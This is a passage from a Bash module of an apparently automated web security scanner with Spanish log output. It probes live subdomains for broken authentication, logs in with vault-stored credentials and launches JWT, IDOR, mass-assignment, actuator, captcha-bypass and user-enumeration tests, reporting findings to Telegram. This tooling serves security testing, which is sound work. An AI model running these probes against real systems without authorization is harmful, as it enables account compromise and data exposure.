🔗 \`${TEST_URL}\`
📝 Param: \`${PARAM}\` = \`${EVIL}\`
🔍 ${TRACE_SNIPPET:0:200}
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
        break
      fi
    done
  done <<< "$ENDPOINTS"
}

# ── Test: Unauthenticated access to API endpoints ─────────────
_test_unauth_access() {
  local BASE_URL="$1" TOKEN="$2" AUTH_HDR="$3" AUTH_PFX="$4"
  local DOMAIN_ID="$5" DOMAIN="$6"

  log_info "  [api_auth] Unauth endpoint probe: $BASE_URL"

  # API endpoints found in DB
  local ENDPOINTS
  ENDPOINTS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
       AND url LIKE '%${BASE_URL%/}%'
       AND (url NOT LIKE '%public%' AND url NOT LIKE '%login%')
     ORDER BY first_seen DESC LIMIT 30;" 2>/dev/null)

  while IFS= read -r URL; do
    [[ -z "$URL" ]] && continue

    # Get authenticated response
    local AUTH_STATUS AUTH_LEN
    AUTH_STATUS=$(curl -s --max-time 10 \
      -H "${AUTH_HDR}: ${AUTH_PFX} ${TOKEN}" \
      -o /dev/null -w "%{http_code}" "$URL" 2>/dev/null)
    [[ "$AUTH_STATUS" != "200" ]] && continue

    AUTH_LEN=$(curl -s --max-time 10 \
      -H "${AUTH_HDR}: ${AUTH_PFX} ${TOKEN}" \
      -o /dev/null -w "%{size_download}" "$URL" 2>/dev/null)

    # Get unauthenticated response
    local UNAUTH_STATUS UNAUTH_LEN
    UNAUTH_STATUS=$(curl -s --max-time 10 \
      -o /dev/null -w "%{http_code}" "$URL" 2>/dev/null)
    UNAUTH_LEN=$(curl -s --max-time 10 \
      -o /dev/null -w "%{size_download}" "$URL" 2>/dev/null)

    # If unauth also returns 200 with significant content → broken auth
    if [[ "$UNAUTH_STATUS" == "200" && "$UNAUTH_LEN" -gt 100 ]]; then
      log_warn "  ⚡ Unauth access: $URL → $UNAUTH_STATUS ($UNAUTH_LEN B)"
      db_add_finding "$DOMAIN_ID" "broken_auth" "high" "$URL" \
        "unauth_api_access" "Endpoint accesible sin autenticación — ${UNAUTH_LEN}B"
      _telegram_send "🔓 *Endpoint sin autenticación*
🌐 \`${DOMAIN}\`
🔗 \`${URL}\`
📊 Sin token: HTTP $UNAUTH_STATUS (${UNAUTH_LEN}B) vs auth: $AUTH_STATUS
⚠️ Broken Authentication
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
    fi
  done <<< "$ENDPOINTS"
}

# ── Module entry point ────────────────────────────────────────
module_run() {
  local DOMAIN="$1"
  local DOMAIN_ID="$2"
  local OUT_DIR="$3"

  log_phase "Módulo 29 — $MODULE_DESC: $DOMAIN"

  source "${SCRIPT_DIR}/core/js_api_extractor.sh" 2>/dev/null || true
  source "${SCRIPT_DIR}/core/proxy.sh"            2>/dev/null || true
  proxy_check

  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  local ALIVE="$OUT_DIR/subs_alive.txt"
  [[ ! -s "$ALIVE" ]] && { log_warn "Sin subdominios alive, saltando"; return; }

  local SINGLE_SUB=""
  [[ "$(wc -l < "$ALIVE" | tr -d ' ')" == "1" ]] && \
    SINGLE_SUB=$(head -1 "$ALIVE" | tr -d '[:space:]')

  local TOTAL_FINDINGS_BEFORE
  TOTAL_FINDINGS_BEFORE=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings WHERE domain_id=${DOMAIN_ID};" 2>/dev/null || echo 0)

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    local BASE_HOST="https://${SUB}"

    # ── Step 1: Extract API config from JS bundles ─────────────
    log_info "[$SUB] Extrayendo config de API desde bundles JS..."
    js_api_extract_all "$DOMAIN_ID" "$SUB" "$BASE_HOST" 2>/dev/null || true

    # ── Step 2: Load config from DB ───────────────────────────
    local CONFIG_JSON
    CONFIG_JSON=$(db_get_api_configs "$DOMAIN_ID" "$SUB")
    [[ -z "$CONFIG_JSON" ]] && { log_info "  [$SUB] Sin config API — saltando tests auth"; continue; }

    local API_BASE AUTH_HDR AUTH_PFX TOKEN_NAME ROLES LOGIN_URL LOGIN_BODY FORCE
    API_BASE=$(echo "$CONFIG_JSON"  | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('api_base',''))" 2>/dev/null)
    AUTH_HDR=$(echo "$CONFIG_JSON"  | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('auth_header','Authorization'))" 2>/dev/null)
    AUTH_PFX=$(echo "$CONFIG_JSON"  | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('auth_prefix','Bearer'))" 2>/dev/null)
    TOKEN_NAME=$(echo "$CONFIG_JSON"| python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('token_name',''))" 2>/dev/null)
    ROLES=$(echo "$CONFIG_JSON"     | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('roles','[]'))" 2>/dev/null)
    LOGIN_URL=$(echo "$CONFIG_JSON" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('login_url',''))" 2>/dev/null)
    LOGIN_BODY=$(echo "$CONFIG_JSON"| python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('login_body',''))" 2>/dev/null)
    FORCE=$(echo "$CONFIG_JSON"     | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('force','{}'))" 2>/dev/null)

    # Resolve full login URL
    local FULL_LOGIN_URL
    if [[ "$LOGIN_URL" == http* ]]; then
      FULL_LOGIN_URL="$LOGIN_URL"
    elif [[ -n "$API_BASE" && -n "$LOGIN_URL" ]]; then
      # API_BASE may be relative: /app/api/v1/ → prepend host
      if [[ "$API_BASE" == /* ]]; then
        FULL_LOGIN_URL="${BASE_HOST}${API_BASE%/}/${LOGIN_URL#/}"
      else
        FULL_LOGIN_URL="${BASE_HOST}/${API_BASE%/}/${LOGIN_URL#/}"
      fi
    fi

    [[ -z "$AUTH_HDR" ]] && AUTH_HDR="Authorization"
    [[ -z "$AUTH_PFX" ]] && AUTH_PFX="Bearer"

    # ── Step 3: Attempt login with vault credentials ───────────
    local TOKEN=""
    local VAULT_ROW
    VAULT_ROW=$(db_vault_get "$DOMAIN_ID" "$SUB")
    if [[ -n "$VAULT_ROW" ]]; then
      local V_USER V_PASS_ENC V_AUTH_TYPE V_SESSION V_APP_URL V_CRED_ID
      IFS='|' read -r V_CRED_ID V_USER V_PASS_ENC V_AUTH_TYPE V_SESSION V_APP_URL <<< "$VAULT_ROW"

      # Decrypt password (only if vault key set)
      local V_PASS
      if [[ -n "${VAULT_KEY:-}" ]] && command -v python3 &>/dev/null; then
        V_PASS=$(python3 "${SCRIPT_DIR}/core/vault.py" decrypt "$V_PASS_ENC" 2>/dev/null)
      else
        V_PASS="$V_PASS_ENC"
      fi

      # Fallback: use vault's stored app_url if we couldn't construct FULL_LOGIN_URL
      if [[ -z "$FULL_LOGIN_URL" && -n "$V_APP_URL" ]]; then
        FULL_LOGIN_URL="$V_APP_URL"
        log_info "  [$SUB] Usando URL de login del vault: $FULL_LOGIN_URL"
      fi

      if [[ -n "$FULL_LOGIN_URL" && -n "$V_USER" && -n "$V_PASS" ]]; then
        log_info "  [$SUB] Login via $FULL_LOGIN_URL as $V_USER..."
        local LOGIN_RESULT
        LOGIN_RESULT=$(_api_login "$FULL_LOGIN_URL" "$V_USER" "$V_PASS" \
          "$LOGIN_BODY" "$FORCE" "$AUTH_HDR" "$AUTH_PFX")
        TOKEN=$(echo "$LOGIN_RESULT" | cut -d'|' -f1)
        if [[ -n "$TOKEN" ]]; then
          log_ok "  [$SUB] Login OK — token obtenido (${#TOKEN} chars)"
          # Update session in vault
          db_vault_update_session "$V_CRED_ID" "$TOKEN" 2>/dev/null || true
        else
          log_warn "  [$SUB] Login fallido — continuando sin auth"
        fi
      fi
    else
      log_info "  [$SUB] Sin credenciales en vault — solo tests sin auth"
    fi

    # Resolve full API base URL
    local FULL_API_BASE
    if [[ -n "$API_BASE" ]]; then
      if [[ "$API_BASE" == http* ]]; then
        FULL_API_BASE="$API_BASE"
      elif [[ "$API_BASE" == /* ]]; then
        FULL_API_BASE="${BASE_HOST}${API_BASE}"
      else
        FULL_API_BASE="${BASE_HOST}/${API_BASE}"
      fi
    else
      FULL_API_BASE="$BASE_HOST"
    fi

    # ── Step 4: Run security tests ─────────────────────────────
    local TEST_PIDS=()

    # Tests that don't require auth
    (
      # Captcha bypass on login endpoint
      if [[ -n "$FULL_LOGIN_URL" ]]; then
        _test_captcha_bypass "$FULL_LOGIN_URL" "$DOMAIN_ID" "$DOMAIN" "$LOGIN_BODY"
      fi
      # User enumeration on password reset
      local RESET_CANDIDATES
      RESET_CANDIDATES=$(sqlite3 "$DB_PATH" \
        "SELECT DISTINCT url FROM urls
         WHERE domain_id=${DOMAIN_ID}
           AND url LIKE '%${SUB}%'
           AND (url LIKE '%password%' OR url LIKE '%reset%'
                OR url LIKE '%recover%' OR url LIKE '%forgot%'
                OR url LIKE '%contrasenya%' OR url LIKE '%passwords%')
         LIMIT 5;" 2>/dev/null)
      while IFS= read -r RURL; do
        [[ -z "$RURL" ]] && continue
        _test_user_enum "$RURL" "$DOMAIN_ID" "$DOMAIN"
      done <<< "$RESET_CANDIDATES"
    ) &
    TEST_PIDS+=($!)

    # Actuator test (with and without auth)
    (
      _test_actuator "$FULL_API_BASE" "$TOKEN" "$AUTH_HDR" "$AUTH_PFX" "$DOMAIN_ID" "$DOMAIN"
    ) &
    TEST_PIDS+=($!)

    # Auth-dependent tests
    if [[ -n "$TOKEN" ]]; then
      (
        _test_jwt_attacks "${FULL_API_BASE}" "$TOKEN" "$AUTH_HDR" "$AUTH_PFX" \
          "$DOMAIN_ID" "$DOMAIN"
      ) &
      TEST_PIDS+=($!)

      (
        _test_api_idor "$FULL_API_BASE" "$TOKEN" "$AUTH_HDR" "$AUTH_PFX" \
          "$DOMAIN_ID" "$DOMAIN"
      ) &
      TEST_PIDS+=($!)

      (
        _test_mass_assignment "$FULL_API_BASE" "$TOKEN" "$AUTH_HDR" "$AUTH_PFX" \
          "$DOMAIN_ID" "$DOMAIN"
      ) &
      TEST_PIDS+=($!)

      (
        _test_stack_trace "$FULL_API_BASE" "$TOKEN" "$AUTH_HDR" "$AUTH_PFX" \
          "$DOMAIN_ID" "$DOMAIN"
      ) &
      TEST_PIDS+=($!)

      (
        _test_unauth_access "$FULL_API_BASE" "$TOKEN" "$AUTH_HDR" "$AUTH_PFX" \
          "$DOMAIN_ID" "$DOMAIN"
      ) &
      TEST_PIDS+=($!)
    fi

    wait "${TEST_PIDS[@]}" 2>/dev/null || true

  done < "$ALIVE"

  local TOTAL_NEW
  TOTAL_NEW=$(( $(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings WHERE domain_id=${DOMAIN_ID};" 2>/dev/null || echo 0) - TOTAL_FINDINGS_BEFORE ))

  if [[ "$TOTAL_NEW" -gt 0 ]]; then
    _telegram_send "🔐 *API Auth Scan completado*
🌐 \`${DOMAIN}\`
🔍 $TOTAL_NEW nuevos findings
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
  fi

  log_ok "$MODULE_DESC completado: $TOTAL_NEW nuevos findings"
}
